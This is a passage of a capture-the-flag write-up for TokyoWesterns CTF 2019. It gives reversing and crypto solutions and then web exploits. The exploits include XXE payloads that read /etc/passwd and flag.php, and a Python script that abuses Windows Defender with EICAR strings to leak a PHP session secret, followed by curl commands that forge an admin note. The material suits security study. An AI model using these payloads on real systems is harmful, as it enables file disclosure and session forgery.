    p[<span class="hljs-number">6</span>] = arr[<span class="hljs-number">2</span>];
    p[<span class="hljs-number">7</span>] = arr[<span class="hljs-number">3</span>];
    <span class="hljs-keyword">if</span> (check4(y))
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c%c%c%c%c%c%c%c\n"</span>, a, b, c, d, arr[<span class="hljs-number">0</span>], arr[<span class="hljs-number">1</span>], arr[<span class="hljs-number">2</span>], arr[<span class="hljs-number">3</span>]);
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>*argv[])</span>
</span>{
    <span class="hljs-keyword">uint8_t</span> a, b, c, d;
    <span class="hljs-keyword">uint8_t</span> begin = <span class="hljs-number">0</span>, end = <span class="hljs-number">63</span>;

    <span class="hljs-keyword">for</span> (a = begin; a &lt; end; a++)
    {
        <span class="hljs-keyword">for</span> (b = begin; b &lt; end; b++)
        {
            <span class="hljs-keyword">for</span> (c = begin; c &lt; end; c++)
            {
                <span class="hljs-keyword">for</span> (d = begin; d &lt; end; d++)
                {
                    crack(chars[a], chars[b], chars[c], chars[d]);
                }
            }
        }
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"a: %c\n"</span>, chars[a]);
    }
}

</code></pre><h3 id="holy-grail-war"><a class="header-link" href="#holy-grail-war"></a>Holy Grail War</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ROL</span><span class="hljs-params">(a, b)</span>:</span>
    <span class="hljs-keyword">return</span> ((a &lt;&lt; b) &amp; <span class="hljs-number">0xFFFFFFFF</span>) | (a &gt;&gt; (<span class="hljs-number">0x20</span> - b))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ROR</span><span class="hljs-params">(a, b)</span>:</span>
    <span class="hljs-keyword">return</span> ((a &lt;&lt; (<span class="hljs-number">0x20</span> - b)) &amp; <span class="hljs-number">0xFFFFFFFF</span>) | (a &gt;&gt; (b))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ADD</span><span class="hljs-params">(a, b)</span>:</span>
    <span class="hljs-keyword">return</span> ((a + b) &amp; <span class="hljs-number">0xFFFFFFFF</span>)  
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SUB</span><span class="hljs-params">(a, b)</span>:</span>
    <span class="hljs-keyword">return</span> ((a - b) &amp; <span class="hljs-number">0xFFFFFFFF</span>)  
keys = [
<span class="hljs-string">"ee9ef18322ed45da846d740f6dab5659efc01789b6f35c7add1267791ffb096069c55b6ad3576c37380dbae978e082bec16c8577eecf73a2832c14d4a674730168aeaea30423b5029e4b3d0ebf80b01e4b37a8300f0ff18409358202abbfdad0c65353c88e268e76"</span>,
<span class="hljs-string">"810378a893b825d35ff2892881923c097013a30cbebb1af0eb1e9b06cd655b3312f8a0db2e1f6426e048cdcd0980fb2f6d7d07754a62238f0af2c87101b854e236a93b442f4a4f6f5f59ba8aa630859a0e5a2ac48d30d89abd8d6242de10abab0e66959f3ce90eae"</span>,
<span class="hljs-string">"504935776d303b1135128a3fd16eafe3e9d14cf5e871fb9eba448d297022678f2370a9e95bd40071e4a5f208a5e409eec79f53c6538753c84b1b9ef50e2968d203d2f176b2e91799d4328a900101d2e88ef89260ec73fc845827d9cb2464a64417957782febe39ec"</span>,
<span class="hljs-string">"f82654105fd5452901c16e5a75fc603ca35f36bc9c697655158754991fbd081c975637d54cfc161f91e71b54ff149316dbc2bfdd7f1e139c6e6a9bec9808701967c00b63c8df545161579a7304e3bc9e469d8f6da45690369ee0c45be8bb39a1623d0293779197e5"</span>,
<span class="hljs-string">"edb6156e9e3459f2d8fdd4fe2b489a75d60f154bf19826d4e18cd885ee96372594f61a9447b39709bb2eb2cd6cf55e36903e8f45c336c5a14d28e100377b555ff8dff6ad96a06062f51fb83d0a078e7afa09067a19ed6d9ed54377375b5aad8e2147bf69a493ea04"</span>,]
keys = map(<span class="hljs-keyword">lambda</span> x:unpack(<span class="hljs-string">'&lt;26I'</span>, x.decode(<span class="hljs-string">'hex'</span>)), keys)

s = <span class="hljs-string">'d4f5f0aa8aeee7c83cd8c039fabdee6247d0f5f36edeb24ff9d5bc10a1bd16c12699d29f54659267'</span>.decode(<span class="hljs-string">'hex'</span>)
flag = <span class="hljs-string">''</span>
r = <span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, len(s), <span class="hljs-number">8</span>):
    x, y = unpack(<span class="hljs-string">'&gt;2I'</span>, s[i:i+<span class="hljs-number">8</span>])
    k = keys[r]
    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">24</span>):
        i = <span class="hljs-number">24</span> - ii - <span class="hljs-number">1</span>
        y, t = x, y
        x = ROR(SUB(t, k[i + <span class="hljs-number">2</span>]), y &amp; <span class="hljs-number">0x1F</span>) ^ y 
    y = SUB(y, k[<span class="hljs-number">1</span>])
    x = SUB(x, k[<span class="hljs-number">0</span>])
    flag += pack(<span class="hljs-string">'&gt;2I'</span>, x, y)
    r += <span class="hljs-number">1</span>
print(flag)
</code></pre><p>Flag: <code>TWCTF{Fat3_Gr4nd_Ord3r_1s_fuck1n6_h07}</code></p>
<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
<h3 id="welcome"><a class="header-link" href="#welcome"></a>Welcome</h3>
<p>The flag is <code>TWCTF{Welcome_to_TWCTF_2019!!!}</code>.</p>
<h3 id="survey"><a class="header-link" href="#survey"></a>Survey</h3>
<p>Submit form and you get the flag</p>
<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
<h3 id="real-baby-rsa"><a class="header-link" href="#real-baby-rsa"></a>real-baby-rsa</h3>
<p>Crack it byte by byte.</p>
<h3 id="simple-logic"><a class="header-link" href="#simple-logic"></a>Simple Logic</h3>
<p>We can enumerate the lower bits of key. The lower bits of encrypted text should be correct once we find the correct lower bits (e.g. 0~7 bit) of key. After finding the lower bits of key, we can then enumerate some higher bits (e.g. 8~15 bit) of it.</p>
<h3 id="happy!"><a class="header-link" href="#happy!"></a>Happy!</h3>
<p>Coppersmith attack:</p>
<pre class="hljs"><code><span class="hljs-attr">pol</span> = x^<span class="hljs-number">2</span> - inverse_mod(cf,N)*x
<span class="hljs-attr">beta</span> = <span class="hljs-number">1</span>
<span class="hljs-attr">roots</span> = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)
</code></pre><h3 id="m-poly-cipher"><a class="header-link" href="#m-poly-cipher"></a>M-Poly-Cipher</h3>
<p>This cipher algorithm is as follows.</p>
<ul class="list">
<li>genkey<ol class="list">
<li>Generate 8x8 matrices $K1, K2, K3, P$.</li>
<li>The first 4 rows of $K1$ and $K2$ and all elements of $P$ is generated randomly. The last 4 rows of $K1$ and $K2$ are linear correlated with their first 4 rows.</li>
<li>Find $K3$ that satisfies $K1<em>P</em>P+K2*P+K3=0$.</li>
<li>$K1, K2, K3$ are public keys. $P$ is private key.</li>
</ol>
</li>
<li>encrypt<ol class="list">
<li>A = convert_to_matrix(text)</li>
<li>Generate random matrix S.</li>
<li>$E1 = S <em> K1, E2 = S </em> K2, E3 = A + S * K3$</li>
<li>$E1, E2, E3$ are encrypted text</li>
</ol>
</li>
<li>decrypt<ol class="list">
<li>$A = E1<em>P</em>P + E2*P + E3$</li>
<li>text = convert_to_text(A)</li>
</ol>
</li>
</ul>
<p>We can solve $S$ through $S = (E1 + E2) <em> ((K1 + K2)^{-1})$. Then $A = E3 - S </em> K3$.</p>
<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
<h3 id="j2x2j"><a class="header-link" href="#j2x2j"></a>j2x2j</h3>
<p>URL: <a href="http://j2x2j.chal.ctf.westerns.tokyo/">http://j2x2j.chal.ctf.westerns.tokyo/</a></p>
<p>Basically, it is a converter service for JSON</p>
<p>we were able to leak the <code>/etc/passwd</code> file by using XXE vulnerability</p>
<pre class="hljs"><code><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-meta">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">stockCheck</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">productId</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">productId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">stockCheck</span>&gt;</span></code></pre><p>Since it is PHP, we can RFI using <code>php://</code> and arbitrarily load a file we want. For this challenge, we used <code>php://filter</code> to base64-encode the flag.php file.</p>
<pre class="hljs"><code><span class="hljs-meta">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.php"&gt; ]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">contacts</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">contact</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Jean &amp;xxe; Dupont<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">phone</span>&gt;</span>00 11 22 33 44<span class="hljs-tag">&lt;/<span class="hljs-name">phone</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">adress</span>&gt;</span>42 rue du CTF<span class="hljs-tag">&lt;/<span class="hljs-name">adress</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">zipcode</span>&gt;</span>75000<span class="hljs-tag">&lt;/<span class="hljs-name">zipcode</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">city</span>&gt;</span>Paris<span class="hljs-tag">&lt;/<span class="hljs-name">city</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">contact</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">contacts</span>&gt;</span></code></pre><p>Response of the above request is as followes:</p>
<pre class="hljs"><code>{
    <span class="hljs-attr">"contact"</span>: {
        <span class="hljs-attr">"name"</span>: <span class="hljs-string">"Jean PD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsK Dupont"</span>,
        <span class="hljs-attr">"phone"</span>: <span class="hljs-string">"00 11 22 33 44"</span>,
        <span class="hljs-attr">"adress"</span>: <span class="hljs-string">"42 rue du CTF"</span>,
        <span class="hljs-attr">"zipcode"</span>: <span class="hljs-string">"75000"</span>,
        <span class="hljs-attr">"city"</span>: <span class="hljs-string">"Paris"</span>
    }
}</code></pre><p>By decoding the base64 content from the name, We were able to retrieve the content of the flag.php file.</p>
<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
$flag = <span class="hljs-string">'TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}'</span>;</code></pre><p>Flag: <code>TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}</code></p>
<h3 id="php-note"><a class="header-link" href="#php-note"></a>PHP Note</h3>
<p>The source was available at <code>http://phpnote.chal.ctf.westerns.tokyo/?action=source</code>. We were able to find some little logic bugs in this file.</p>
<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gen_secret</span><span class="hljs-params">($seed)</span> </span>{
    <span class="hljs-keyword">return</span> md5(SALT . $seed . PEPPER);
}

...

<span class="hljs-keyword">if</span> ($action === <span class="hljs-string">'login'</span>) {
    <span class="hljs-keyword">if</span> ($method === <span class="hljs-string">'POST'</span>) {
        $nickname = (string)$_POST[<span class="hljs-string">'nickname'</span>];
        $realname = (string)$_POST[<span class="hljs-string">'realname'</span>];

        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($realname) || strlen($realname) &lt; <span class="hljs-number">8</span>) {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'invalid name'</span>);
        }

        $_SESSION[<span class="hljs-string">'realname'</span>] = $realname;
        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($nickname)) {
            $_SESSION[<span class="hljs-string">'nickname'</span>] = $nickname;
        }
        $_SESSION[<span class="hljs-string">'secret'</span>] = gen_secret($nickname);
    }
    redirect(<span class="hljs-string">'index'</span>);
}
</code></pre><p>As we see in the code above, <code>$_SESSION[&#39;nickname&#39;]</code> is not properly sanitized like <code>$_SESSION[&#39;realname&#39;]</code>, making possible for us to execute <code>gen_secret(&#39;&#39;)</code>, which returns <code>md5(SALT . PEPPER);</code></p>
<p>But this didn&#39;t really help us anything much to find the actual vulnerability.</p>
<p>so we looked a bit around and found out that the server is IIS 10 by looking at the <code>Server:</code> header from the HTTP response.</p>
<pre class="hljs"><code>...
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.9
</code></pre><p>Then We recalled the @icchy&#39;s writeup for the WCTF challenge Gyotaku The Flag (<a href="https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf">https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf</a>)</p>
<p>So we thought of the strategy and was as followes:</p>
<ol class="list">
<li>PHPSESSID is stored in the filesystem.</li>
<li>Considering that this is a Windows + IIS challenge, we can make Windows Defender angry by writing dangerous contents into the session, and destroy PHPSESSID data.</li>
<li>After the dangerous content is removed, we can manipulate the session and leak secret key byte by byte.</li>
</ol>
<p>To prove that this works, we installed a fresh version of windows and installed IIS with PHP and sourcecode on it. then we logged in with the following parameters on login page via POST.</p>
<pre class="hljs"><code>----------1384459925
Content-Disposition: form-data; name="realname"

--!&gt;<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-keyword">var</span> b=<span class="hljs-string">"$EICAR-STANDARD-ANTIVIRUS-TEST-FILE"</span>;<span class="hljs-keyword">var</span> a=<span class="hljs-string">"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H"</span>+<span class="hljs-string">"*"</span>;<span class="hljs-built_in">eval</span>(a);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
----------1384459925
Content-Disposition: form-data; name="nickname"

11
----------1384459925--
</code></pre><p>After that we noticed the <code>Threats found</code> alert, then we found out that some bytes are removed from the PHPSESSID. With that in mind, we made a exploit to leak the flag.</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> requests

URL = <span class="hljs-string">"http://phpnote.chal.ctf.westerns.tokyo"</span> <span class="hljs-comment"># changeme</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">trigger</span><span class="hljs-params">(c, idx)</span>:</span>
   <span class="hljs-keyword">import</span> string
   p = <span class="hljs-string">'''&lt;script&gt;f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&lt;/script&gt;&lt;body&gt;'''</span>
   p = string.Template(p).substitute({<span class="hljs-string">'idx'</span>: idx, <span class="hljs-string">'c'</span>: c})
   <span class="hljs-keyword">return</span> p

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">(idx)</span>:</span>
   l, h = <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>
   <span class="hljs-keyword">while</span> h - l &gt; <span class="hljs-number">1</span>:
       m = (h + l) // <span class="hljs-number">2</span>
       gid = trigger(m, idx)
       <span class="hljs-comment"># r = requests.post(URL + '/?action=login', data={'realname': gid, 'nickname': '1'})</span>
       <span class="hljs-comment"># print r.content</span>
       <span class="hljs-comment"># exit()</span>
       s = requests.session()
       s.post(URL + <span class="hljs-string">'/?action=login'</span>, data={<span class="hljs-string">'realname'</span>: gid, <span class="hljs-string">'nickname'</span>: <span class="hljs-string">''</span>})
       <span class="hljs-keyword">if</span> <span class="hljs-string">"/?action=login"</span> <span class="hljs-keyword">in</span> s.post(URL + <span class="hljs-string">'/?action=login'</span>, data={<span class="hljs-string">'realname'</span>: gid, <span class="hljs-string">'nickname'</span>: <span class="hljs-string">'&lt;/body&gt;'</span>}).content:
           l = m
       <span class="hljs-keyword">else</span>:
           h = m
   <span class="hljs-keyword">return</span> chr(l)

data = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):
   data += leak(i)
   print(data)
</code></pre><pre class="hljs"><code>$ python leak.py
b
bo
bos
bosy
bosyc
bosycr
bosycre
bosycret
bosycret|
bosycret|s
bosycret|s:
bosycret|s:3
bosycret|s:32
...
bosycret|s:32:<span class="hljs-string">"2532bd172578d19923e5348420e02320"</span>;nickname|s
bosycret|s:32:<span class="hljs-string">"2532bd172578d19923e5348420e02320"</span>;nickname|s:
bosycret|s:32:<span class="hljs-string">"2532bd172578d19923e5348420e02320"</span>;nickname|s:7
bosycret|s:32:<span class="hljs-string">"2532bd172578d19923e5348420e02320"</span>;nickname|s:7:
bosycret|s:32:<span class="hljs-string">"2532bd172578d19923e5348420e02320"</span>;nickname|s:7:<span class="hljs-string">"
</span></code></pre><p>Now we have the secret for user with nickname of <code>&lt;/body&gt;</code>.</p>
<pre class="hljs"><code>$ cat flag.php
<span class="hljs-meta">&lt;?php</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Note</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($admin)</span> </span>{
        <span class="hljs-keyword">$this</span>-&gt;notes = <span class="hljs-keyword">array</span>();
        <span class="hljs-keyword">$this</span>-&gt;isadmin = $admin;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addnote</span><span class="hljs-params">($title, $body)</span> </span>{
        array_push(<span class="hljs-keyword">$this</span>-&gt;notes, [$title, $body]);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getnotes</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;notes;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;isadmin === <span class="hljs-keyword">true</span>) {
            <span class="hljs-keyword">echo</span> FLAG;
        }
    }
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify</span><span class="hljs-params">($data, $hmac)</span> </span>{
    $secret = $_SESSION[<span class="hljs-string">'secret'</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($secret)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
    <span class="hljs-keyword">return</span> hash_equals(hash_hmac(<span class="hljs-string">'sha256'</span>, $data, $secret), $hmac);
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hmac</span><span class="hljs-params">($data)</span> </span>{
    $secret = $_SESSION[<span class="hljs-string">'secret'</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($data) || <span class="hljs-keyword">empty</span>($secret)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
    <span class="hljs-keyword">return</span> hash_hmac(<span class="hljs-string">'sha256'</span>, $data, $secret);
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gen_secret</span><span class="hljs-params">($seed)</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-string">"2532bd172578d19923e5348420e02320"</span>;
}

<span class="hljs-comment">// create session</span>
$_SESSION = <span class="hljs-keyword">Array</span>();
$_SESSION[<span class="hljs-string">'secret'</span>] = gen_secret(<span class="hljs-string">''</span>);
$_SESSION[<span class="hljs-string">'realname'</span>] = <span class="hljs-string">"stypr stypr"</span>;
$_SESSION[<span class="hljs-string">'nickname'</span>] = <span class="hljs-string">""</span>;

<span class="hljs-comment">// generate note</span>
$note = <span class="hljs-keyword">new</span> Note(<span class="hljs-keyword">true</span>);
$note-&gt;addnote(<span class="hljs-string">"work"</span>, <span class="hljs-string">"work"</span>);
$data = base64_encode(serialize($note));

<span class="hljs-comment">/* verify
//echo "Data: ".(string)$data."\n";
//echo "HMAC: ".(string)hmac($data)."\n";
//echo "-----";
//var_dump(verify((string)$data, (string)hmac($data)));
*/</span>
<span class="hljs-meta">?&gt;</span>
curl -s <span class="hljs-string">'http://phpnote.chal.ctf.westerns.tokyo/?action=logout'</span> -H <span class="hljs-string">'Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;'</span> --insecure
curl -s <span class="hljs-string">'http://phpnote.chal.ctf.westerns.tokyo/?action=login'</span> -H <span class="hljs-string">'Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a;'</span> --data <span class="hljs-string">'nickname=&lt;/body&gt;&amp;realname=stypr+stypr'</span> --compressed --insecure
curl -s <span class="hljs-string">"http://phpnote.chal.ctf.westerns.tokyo/?action=getflag"</span> -H <span class="hljs-string">"Cookie: PHPSESSID=468b674d8d6139373a064b832efdf47a; note=&lt;?php echo $data; ?&gt;; hmac=&lt;?php echo hmac($data); ?&gt;;"</span>
</code></pre><pre class="hljs"><code>$ php flag.php | sh | grep <span class="hljs-string">"TWCTF"</span>
TWCTF{h0pefully_I_haven<span class="hljs-string">'t_made_a_m1stake_again}&lt;!doctype html&gt;
</span></code></pre><p>Flag: <code>TWCTF{h0pefully_I_haven&#39;t_made_a_m1stake_again}</code></p>
        </article>
      </div>
    </div>
  </body>
</html>
<!--
    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
    Respective Copyrights apply.
 -->
